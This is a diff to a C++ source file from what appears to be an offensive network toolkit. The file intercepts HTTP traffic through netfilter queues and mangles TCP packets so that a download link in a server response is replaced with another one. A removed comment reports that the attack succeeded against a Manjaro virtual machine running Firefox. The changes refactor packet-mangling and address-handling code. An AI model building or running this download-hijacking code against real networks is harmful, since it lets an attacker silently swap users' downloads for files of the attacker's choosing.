@@ -11,15 +11,6 @@
 #include <poll.h>
 #include <cstring>
 
-// IMPORTANT:
-/*
-    When mangling the packet, we are making it the same length as the original packet in order to avoid
-    having to mess around with seq/ack numbers. This is probably not the best thing to do? Also
-    this program has only been tested against a Manjaro virtual machine (arch linux x64) which used a Firefox browser. 
-    The attack worked, but the download page loaded for an unusually long time. The attack did NOT work on the 
-    default browser of the Manjaro machine. TODO: find out why and fix!!!
-*/
-
 static bool32 FilterTCPReq(const char* downloadLink, tcphdr* tcpHeader, char* payload, uint32_t& initialAckNum)
 {
     uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
@@ -92,16 +83,14 @@ static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buf
 
     if(ipVersion == AF_INET)
     {
-        // NOTE: is the final argument (rep_size) correct? When trying to use the httpResponse string length it will
-        // give a segmentation fault..
-        if(nfq_tcp_mangle_ipv4(pkBuff, matchOffset, matchLen, httpResponse, matchLen) < 0)
+        if(nfq_tcp_mangle_ipv4(pkBuff, matchOffset, matchLen, httpResponse, responseCodeLen) < 0)
         {
             free(httpResponse);
             LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
             return APPLICATION_ERROR;
         }
     }
-    else
+    else // NOTE: NOT TESTED!
     {
         if(nfq_tcp_mangle_ipv6(pkBuff, matchOffset, matchLen, httpResponse, responseCodeLen) < 0)
         {
@@ -153,7 +142,6 @@ static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buf
 uint32_t initialAckNum{0}; // network byte order
 bool32 processRequest{TRUE};
 bool32 processResponse{FALSE};
-char serverAddr[INET6_ADDRSTRLEN]{};
 
  // returns -1 on error, 1 when packet does not match criteria, 0 when the correct packet is found and processed
  int ProcessRequest(nfqnl_msg_packet_hdr* ph, pkt_buff* pkBuff, uint32_t ipVersion, CHaks::NetFilterCallbackData& callbackData)
@@ -225,7 +213,7 @@ char serverAddr[INET6_ADDRSTRLEN]{};
     {
         if(ipVersion == AF_INET)
         {
-            if(inet_ntop(AF_INET, &ipv4Header->daddr, serverAddr, INET6_ADDRSTRLEN) == nullptr)
+            if(inet_ntop(AF_INET, &ipv4Header->daddr, callbackData.serverIPStr, INET6_ADDRSTRLEN) == nullptr)
             {
                 LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                 return -1;
@@ -233,7 +221,7 @@ char serverAddr[INET6_ADDRSTRLEN]{};
         }
         else
         {
-            if(inet_ntop(AF_INET6, &ipv6Header->ip6_dst, serverAddr, INET6_ADDRSTRLEN) == nullptr)
+            if(inet_ntop(AF_INET6, &ipv6Header->ip6_dst, callbackData.serverIPStr, INET6_ADDRSTRLEN) == nullptr)
             {
                 LOG_ERROR(APPLICATION_ERROR, "inet_ntop() error");
                 return -1;
